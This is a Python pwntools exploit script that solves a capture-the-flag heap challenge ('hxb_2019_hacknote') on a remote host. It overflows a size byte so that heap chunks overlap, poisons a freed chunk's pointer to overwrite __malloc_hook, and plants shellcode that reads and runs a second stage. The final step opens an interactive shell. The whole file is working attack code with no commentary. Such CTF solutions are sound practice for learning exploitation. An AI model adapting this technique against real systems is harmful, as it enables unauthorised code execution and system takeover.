# -*- encoding: utf-8 -*-
from pwn import * 
binary = './hxb_2019_hacknote'
context.binary = binary

elf = ELF(binary)
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = 'redirect.do-not-trust.hacking.run'
    port = '10347'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('Exit\n-----------------',num)

def add(size , text = 'a\n'):
    cmd(1)
    sla('Size:' , size)
    sa('Note:' , text)

def edit(idx , text):
    cmd(3)
    sla('Note:' , idx)
    sla('the Note:' , text)

def delete(idx):
    cmd(2)
    sla('Note:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    __malloc_hook = 0x0000000006CB788

    add(0x18 )

    add(0x38 ) #1
    add(0x38 ) #2
    add(0x38 ) #3

    add(0x68 )

    edit(0 , 'b'*0x18)
    edit(0 , 'b'*0x18 + p8(0x40*3+1))

    delete(1)
    add(0x38 ) #1
    add(0x38 ) #5 #2
    add(0x38 ) #6 #3

    delete(1)
    delete(2)

    edit(5 , p64(__malloc_hook - 0xe - 8))
    
    shellcode = asm(shellcraft.read(0,'rsp',0xff)+';jmp rsp')
    # 偷的 aidai 爷的短 shellcode

    add(0x38 )
    add(0x38 , 'a'*6 + p64(__malloc_hook + 8) + shellcode + '\n')

    cmd(1)
    sla('Size:' , 0x10)

    se(asm(shellcraft.sh()))
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   hxb_2019_hacknote.py
@Time    :   2022/01/18 13:54:59
@Author  :   Niyah 
'''